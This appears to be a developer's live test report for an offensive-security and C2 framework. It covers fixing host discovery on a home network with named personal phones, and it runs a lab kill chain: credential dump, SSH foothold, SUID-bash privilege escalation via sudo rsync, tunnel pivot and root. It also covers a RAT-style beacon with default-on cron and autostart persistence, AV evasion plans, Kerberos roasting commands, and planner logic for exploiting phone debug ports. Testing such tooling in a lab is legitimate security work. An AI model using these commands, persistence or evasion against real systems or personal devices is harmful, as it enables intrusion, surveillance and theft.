# Live re-test — 2026-10-16 (follow-up to `Live_Test_2026-10-16.md`)

Same day, second pass, same operator machine (Windows 11 + Kali WSL2 + Docker
Desktop). `dev` line.

The first report recorded two live hosts that "did not respond" (`.6`, `.18`)
and left the exploit/payload/beacon phases to the operator. Both conclusions
were wrong and this document says why, what was fixed, and what the full chain
does when actually driven.

---

## 0. Why `.6` and `.18` looked dead — the real defect

`phantom/core/netmap.py::discover_network` resolved its external tools with
`shutil.which("arp-scan")` / `shutil.which("nmap")`. On a Windows box nmap is
**not** on the native PATH — it lives in the Kali distro (verified:
`/usr/bin/nmap`, WSL2 in **mirrored** networking, so the distro is really on
the LAN: `eth3 = 192.168.1.155/24`). Everywhere else in Phantom a
Windows-native miss is bridged through WSL (`phantom/core/executor.py::_rewrite_wsl`,
`phantom/automation/runtime/toolchain.py::_wsl_which`); the network mapper was
the one caller that never did.

Consequence: the mapper silently degraded to its last-resort **ICMP ping
sweep**, and both hosts drop echo requests (Windows firewall default; a phone
in sleep). They were on the network the whole time:

```
$ wsl -d kali-linux nmap -sn -PR 192.168.1.0/24
Nmap scan report for A34-di-cristian.homenet.telecomitalia.it (192.168.1.6)
MAC Address: 62:EB:35:3E:74:17 (Unknown)
Nmap scan report for cristian.homenet.telecomitalia.it (192.168.1.18)
MAC Address: 38:D5:7A:A8:C9:F5 (Cloud Network Technology Singapore PTE.)
Nmap done: 256 IP addresses (10 hosts up) scanned in 5.75 seconds
```

A missing tool must never be mistaken for an empty network — the same
dishonesty class this project already fixed one layer down.

## 1. Fixes landed in this run

| # | File | Change |
| --- | --- | --- |
| 1 | `phantom/core/netmap.py` | `_tool_argv()`: resolve `nmap`/`arp-scan` through the WSL bridge when the native PATH has no hit (returns an argv prefix, so `wsl -d kali-linux nmap …` is executed as one command). |
| 2 | `phantom/core/netmap.py` | nmap host discovery is now `-sn -PR -PS22,80,443,445,139,3389,8080,5555`: ARP first (answers regardless of ICMP filtering) plus a TCP ping on the ports a live device usually holds. |
| 3 | `phantom/core/netmap.py` | `_arp_cache_hosts()`: the OS neighbour (ARP) table is now a **discovery source**, not only an enrichment lookup — it is the one source that still answers for a host that drops ICMP. Filtered to the scanned subnets, network/broadcast addresses excluded. |
| 4 | `phantom/core/netmap.py` | `_arp_cache_alive()` + `check_hosts_alive()`: a ping miss is corrected when the host's MAC is still in the neighbour cache on our own subnet — the map no longer paints a device that is right there as `offline`. |
| 5 | `phantom/core/netmap.py` | `_mac_vendor()` returns `""` for broadcast/null MACs (the locally-administered bit made `ff:ff:…` come out as "Randomized (privacy MAC)"). |
| 6 | `phantom/core/netmap.py` | **Scope fix**: a bare-IP target is a `/32`, not the `/24` around it (`{"target": "192.168.1.6"}` swept the whole network — the defect the first report flagged). |
| 7 | `phantom/utils/network.py` | `c2_endpoint_status()` — the resolver `generate` uses — now honours an explicit `PHANTOM_C2_HOST` and a configured `c2.front` before falling back to `session.lhost`. It ignored both, so the artefact the C2 shell built could carry a different endpoint from the one the auto-mode path resolves through `get_c2_endpoint()` (two artefacts, two endpoints, one of which can never check in). |
| 8 | `phantom/automation/reasoning.py` | **Mobile open ports are worked, not just classified**: the `android` role (port 5555) existed in `_ROLE_BY_PORT` with **no branch** in `_rule_service_roles`, so a phone with ADB over Wi-Fi open registered the role and proposed *nothing*; the other device-control channels were not in any table at all. Added the `android`/`device-debug` branch (`service_exploit` + `http_probe`) and `_DEVICE_PORTS` = {9222 Chrome/WebView DevTools, 8022 Termux sshd, 62078 iOS lockdown, 1716 KDE Connect, 8384 Syncthing}. |

### Evidence — discovery, through Phantom's own code path

```
$ python -c "from phantom.core import netmap; print(netmap._tool_argv('nmap'))"
['wsl', '-d', 'kali-linux', 'nmap']

$ python -c "from phantom.core import netmap; r = netmap.discover_network(timeout=90); ..."
method=nmap -sn + arp-cache  hosts=11
broadcast/junk entries: []
192.168.1.6  -> FOUND ('A34-di-cristian...', '62:EB:35:3E:74:17', True)
192.168.1.18 -> FOUND ('cristian...', '38:D5:7A:A8:C9:F5', True)
```

The ARP-cache source also surfaced `192.168.1.221` (`S25-di-Cristian`, second
phone) which neither sweep reported.

### Tests

```
tests/test_netmap_triage_liveness.py tests/test_craft_netmap.py
tests/test_network_surface_gates.py tests/test_tls_follows_the_listener.py
tests/test_beacon_front.py tests/test_toolchain.py tests/test_c2.py
tests/test_c2_ux.py tests/test_c2_state_persistence.py tests/test_c2_resilience.py
→ 167 passed
```

(`shutil.which` is mocked by the netmap tests; the resolver still goes through
it first, so those contracts are unchanged.)

### Evidence — the mobile path before/after

```
phone + tcp/5555 (ADB)      before: ['osint_identity']
phone + tcp/9222 (DevTools) before: ['osint_identity']
phone + tcp/8022 (Termux)   before: ['osint_identity']
                            after : ['http_probe', 'osint_identity', 'service_exploit']
```

The identity posture was never wrong in itself — `test_mobile_surface_proposes_service_exploit`
and `test_a_thin_mobile_surface_reaches_for_identity` encode the intent (identity
work when the surface is EMPTY, service work when a surface exists). What was
missing is that "a surface exists" was only recognised for a discovered *mobile
endpoint*, never for an open port on the device.

## 2. The lab kill chain, driven end to end

Lab up (`lab/docker-compose.yml`): `dmz 172.28.0.10` (published
`8081`/`2222`/`2121`), `internal 172.28.0.20`, `dc 172.28.0.30`.

| Phase | Command / engine | Result |
| --- | --- | --- |
| 1. Web SQLi + SSRF → creds | `phantom.automation.exploit.webcreds.run_web_creds_dump` (the engine behind `use web` → `creds`) | `admin/W1nt3r2024!x`, **`backup/S3cureB4ckup!22`** in **0.3 s** (`sqli-hash`, conf 0.85) |
| 2. Foothold | `backup@dmz:2222` (via WSL `sshpass`, the path the executor builds) | `uid=1000(backup)`; `sudo -n -l` → `(ALL) NOPASSWD: /usr/bin/rsync` |
| 3. Vertical on dmz | `sudo -n rsync -a --chmod=4777 /bin/bash /tmp/rootshell` then `/tmp/rootshell -p -c id` | `euid=0(root)` |
| 4. Pivot → internal | `-L 2200:172.28.0.20:22` through the dmz foothold | `dev@internal` reached (the tunnel is the mechanism the pivot module uses) |
| 5. Vertical on internal | `/usr/local/bin/roothelper` (SUID, `system("/bin/bash -p")`) — driven via `printf '…' \| roothelper` because a `bash -p` with no tty reads an empty stdin and exits 0 | `uid=0(root) gid=0(root)` |
| 6. Proof | `cat /root/flag.txt` | **`PHANTOM{internal_root_compr0mised_8912}`** |

Phases 1–6 of the lab's documented chain are therefore verified live, and
phases 3–6 were driven by hand through the foothold (the `pivot` /`exploit`
module equivalents, not the module TUI).

## 3. The C2 half, on this machine

Runnable artefacts per platform differ: `compile_beacon("linux", …)` →
`payloads/beacon/beacon_linux` (ELF, 414 008 B); `compile_beacon("windows", …)`
→ `beacon.bin` (raw shellcode, 1 535 920 B) with the PE at `beacon.pe`
(1 589 248 B) as the reference build.

| Step | Result |
| --- | --- |
| Listener | `server_instance.start(host="127.0.0.1", port=8443, use_ssl=True)` → thread alive, `bind_error=None`, port open |
| Plaintext attempt | `use_ssl=False` is **refused** while `use_mtls()` is on (logged, `thread` stays `None`) — correct guard, not a failure |
| Check-in | Linux beacon in WSL: `B-81D07E3465A465DD`, `os=Linux 6.6.87.2-microsoft-standard-WSL2`, `user=kali`, `host=MSI`, `ip=127.0.0.1`, check-in at **0 s** |
| Auto-persistence | On first check-in: `Native persistence established: [autostart] …/PhantomBeacon.desktop`, `[cron] */10 * * * * ~/.local/bin/pb_beacon`, binary copied to `~/.local/bin/`. Gated by `c2.auto_persist` / `PHANTOM_AUTO_PERSIST` (default **on**), audited as an `engagement_grants` event. |
| Task: `whoami` | `User: kali \| Hostname: MSI` |
| Task: `shell id` | `uid=1000(kali) gid=1000(kali) groups=…` |
| Task: `set-sleep 1` | `Cadence set: 1ms (jitter 30%)` |
| Kill from the server | `exit` → beacon process **gone in 0 s** |
| Audit trail | `data/c2_audit.log`: `task_queued` / `task_result` entries with hash chain and `output_len` |

**Beacon id is deterministic for a given build** (`B-81D07E…` on every run of
the same binary), so re-deploying the same artefact reuses the existing
registry record — worth knowing before reading "the old beacon is still there"
as a live beacon.

### Everything this run created was removed

`/tmp/pb_beacon` + `/tmp/pb.log`, `~/.local/bin/pb_beacon`,
`~/.config/autostart/PhantomBeacon.desktop`, the cron line (removed surgically
with `crontab -l | grep -v pb_beacon | crontab -`, not `crontab -r`), the
`/tmp/rootshell` SUID copy on the dmz, the SSH tunnel, and the listener. WSL
residue re-checked afterwards: crontab empty, autostart empty, no process.

## 4. Findings NOT fixed here

1. **Defender blocks the compiled Windows beacon at launch**
   `OSError [WinError 225] … il file contiene un virus o software potenzialmente indesiderato`
   on `phantom/payloads/beacon/beacon.pe`. Out of the box, on a default
   Windows 11 box, the Windows artefact cannot start — the `evasion`/stealth
   dropper path is the intended answer and was not exercised against it.
2. **`queue_task()` accepts an unknown/empty beacon id**
   `c2_state.queue_task(None, "whoami")` returns a task id and writes
   `{"beacon_id": null, …}` into the audit chain, creating a queue no beacon
   can ever drain. Not changed: `tests/test_c2.py`, `test_c2_resilience.py`,
   `test_p1_typed_and_learning.py` all queue for never-registered ids
   (`queue_task("B1", …)`), so refusing unknown ids would contradict the
   existing contract — this needs a decision, not a patch at the end of a run.
3. **WSL toolbox is thinner than the README's install line implies**
   present: `nmap hydra gobuster sshpass whois bind9-dnsutils`; absent:
   `smbclient arp-scan theharvester`. `install_tool('hydra')` was verified to
   route correctly (`wsl -d kali-linux -u root apt-get install -y
   --no-install-recommends hydra` → ok), so the install path works for what is
   in `utils/toolchain.py::TOOLS`; `smbclient` is not in that registry, which
   leaves the SMB/AD phase without an install hint.
4. **A test fixture leaks into the operator's live state**
   `data/sessions/_auto.json` held `target: "ORIG-OPERATOR-TARGET"` (the
   constant from `tests/test_swarm_per_target.py`) with `10.0.0.5` history —
   it is the file the API mirrors the live session to and the one auto-resume
   reads. Backed up as `_auto.json.bak-2026-10-16` and removed.
5. **`compile_beacon` returns different artefact KINDS per platform** (ELF for
   Linux, raw shellcode for Windows). Consistent with the stager design but
   surprising to a caller that expects a runnable file on both.
6. **AS-REP roasting is gated on credentials it does not need**
   `_as_rep_roast_adapter` raises `"as_rep_roast requires a domain and valid
   credentials"`. The attack's whole point is that the account needs *no*
   credential to be roasted — verified in the lab: `GetNPUsers.py -no-pass
   -request 'corp.local/norep'` makes the attempt with no password at all. As
   built, the capability can only run the *authenticated enumeration* variant,
   so an operator with nothing on the domain never reaches the roast.

## 5. NOT tested in this run

### The AD chain against `dc` — tested, and it does not complete

`dc` is not reachable from the host or from WSL (checked: 445 and 389 both
closed from both), so it was exercised the way `lab/README.md` prescribes, in
an ephemeral container on `lab_net` (`python:3.11`, already present locally).

Phantom's command builders were called on the host and the **exact strings they
produce** were run in the container:

```
kerberoast_command  -> GetUserSPNs.py -dc-ip 172.28.0.30 -request corp.local/svc_sql:Svc!2024Strong
as_rep_roast_command-> GetNPUsers.py  -dc-ip 172.28.0.30 -request corp.local/norep:NoRep!2024Strong
```

| What | Result |
| --- | --- |
| impacket packaging | `pip install impacket` (v0.13.1) installs **`GetUserSPNs.py` / `GetNPUsers.py` / `secretsdump.py`**, not `impacket-<name>` — Phantom's primary name choice is right for this build, and `_TOOL_ALIASES` covers the other packaging. |
| LDAP enumeration | **Works**: `svc_sql` carries `HTTP/svc-sql.corp.local`; `adadmin`, `svc_sql`, `norep`, `Administrator` all enumerate. |
| Kerberoast (roast) | **Fails**: `Kerberos SessionError: KRB_AP_ERR_INAPP_CKSUM (Inappropriate type of checksum in message)`, deterministically, with both `-request` and `-request-user svc_sql`. |
| AS-REP roast | **Fails**: `User norep doesn't have UF_DONT_REQUIRE_PREAUTH set` — while the same run's own table prints `norep … UAC 0x400200`, i.e. **4194816**, which *includes* `0x400000 = UF_DONT_REQUIRE_PREAUTH`. The lab object is correct (verified over LDAP); the KDC request is what fails. |

So the AD **recon** half is sound and the **roast** half cannot produce a
crackable hash against this Samba 4.17 DC with impacket 0.13.1 — the same
Kerberos/checksum incompatibility on both paths, not a Phantom defect (the
commands it builds are the canonical ones). Before the AD chain can be walked
end to end, the lab tooling needs a pinned older impacket (or a newer Samba).
(Also observed: Samba AD refuses simple/NTLM LDAP binds — `strongerAuthRequired`
/ session terminated — so a plain `ldap3` probe cannot read the directory at
all; enumeration has to go through impacket.)
* **Mobile network exploitation against a real phone.** No artifact was
  deployed to `.6`, so nothing is claimed about a device. What IS verified is
  the planning half: a phone target with an open device channel now proposes
  service exploitation (`http_probe` + `service_exploit`) instead of identity
  work alone (see §1.8 and its two tests).
* **Payload/exploit/beacon against `.6` and `.18`.** Their discovery is now
  verified; no exploit, payload or beacon was delivered to either. The
  Windows beacon cannot even start on `.18` until finding (1) is dealt with,
  and the beacon is a full RAT (screen, camera, cookies) — an irreversible
  change on a device that holds real data. Building and killing the beacon is
  verified (the `exit` verb above); arming it against a specific host is the
  operator's call.
* **Electron UI re-check of the map** against the new discovery code (the API
  server was not running in this session; the discovery was driven through the
  library path that `/api/network/scan` calls).

## 6. Reproducing

```bash
# discovery through the product code path
python -c "from phantom.core import netmap; \
r=netmap.discover_network(timeout=90); \
print(r['method'], len(r['hosts']))"

# the lab chain's entry point (the engine behind `use web` → `creds`)
python -c "
from phantom.core.knowledge import reset_wm, add_service
from phantom.automation.exploit.webcreds import run_web_creds_dump
wm = reset_wm(target='127.0.0.1', target_type='ip')
add_service(port='8081', service='http', source='scan')
print([(c.username, c.password, c.method) for c in run_web_creds_dump(wm, '127.0.0.1', timeout=60)])"

# the C2 half: listener + beacon + task + kill (never run this outside a lab
# or a machine you own)
PHANTOM_C2_HOST=127.0.0.1 PHANTOM_C2_PORT=8443 PHANTOM_C2_SSL=1 \
  python -c "…"   # see §3; stop the listener and `exit` the beacon afterwards
```
